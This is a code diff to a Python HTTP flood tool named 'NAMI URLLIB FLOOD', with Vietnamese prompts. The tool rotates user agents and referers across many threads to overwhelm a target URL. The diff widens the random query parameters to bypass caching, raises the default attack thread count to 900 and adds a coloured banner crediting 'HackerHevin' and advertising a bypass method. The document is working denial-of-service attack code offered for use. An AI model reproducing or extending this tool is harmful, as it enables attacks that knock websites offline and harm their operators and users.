@@ -1,5 +1,6 @@
 import urllib.request, os, threading, time, random, sys
 from sys import stdout
+from termcolor import colored
 
 ref = [
     'https://duckduckgo.com/',
@@ -144,7 +145,7 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0,9999)) + "=" + str(random.randint(0,9999))
+        self.url = url + "?" + str(random.randint(0,999999)) + "=" + str(random.randint(0,999999))
         self.num = number
         self.headers = self.headers = {
                 'User-Agent': random.choice(ua),
@@ -183,21 +184,23 @@ class Spammer(threading.Thread):
                 pass
         sys.exit(0)
 def title():
-    stdout.write("                                                                                          \n")
-    stdout.write("                   ""       (_)   (_)                  (_)                   \n")
-    stdout.write("                   ""       (__)_ (_)  ____   __   __   _                   \n")
-    stdout.write("                   ""       (_)(_)(_) (____) (__)_(__) (_)                \n")
-    stdout.write("                   ""       (_)  (__)( )_( )(_) (_) (_)(_)                \n")
-    stdout.write("                   ""       (_)   (_) (__)_)(_) (_) (_)(_)                \n")
-    stdout.write("                   ""                                                \n")
-    stdout.write("             "            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("             "+"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+"║             NAMI URLLIB FLOOD             ""          ║\n")
-    stdout.write("             "+"║        ADDED NEW METHOD AND BYPASS    ""              ║\n")
-    stdout.write("             "+"║        ZALO: https://zalo.me/0765698140   ""          ║\n")
-    stdout.write("             "+"╚═════════════════════════════════════════════════════╝\n")
-    stdout.write("\n")
-##############################################################################################
+print(colored(r"""                 
+                          (_)   (_)                  (_)    
+                          (__)_ (_)  ____   __   __   _  
+                          (_)(_)(_) (____) (__)_(__) (_) 
+                          (_)  (__)( )_( )(_) (_) (_)(_)     
+                          (_)   (_) (__)_)(_) (_) (_)(_)      
+           
+                             ══╦═════════════════════════════════╦══
+                 "+"╔═════════╩═════════════════════════════════╩═════════╗
+                 "+"║             NAMI URLLIB FLOOD                                ║
+                 "+"║        ADDED NEW METHOD AND BYPASS                           ║
+                 "+"║        ZALO: https://zalo.me/0765698140                      ║
+                 "+"╚═════════════════════════════════════════════════════╝
+                                                                         Created by HackerHevin""", 'red'))
+
+print(colored("\n============================================================================================\n", 'green'))
+
 class MainLoop():
     
     def __init__(self):
@@ -235,9 +238,9 @@ class MainLoop():
                 print ('Lỗi đọc tệp tin vui lòng xem lại tên file.')
         while True:                
             try:
-                num_threads = int(input('> Nhập sức mạnh tấn công bình thường [800] Max 1500: '))
+                num_threads = int(input('> Nhập sức mạnh tấn công bình thường [900] Max 1500: '))
             except:
-                num_threads = 800
+                num_threads = 900
             break
 
         for i in range(num_threads):
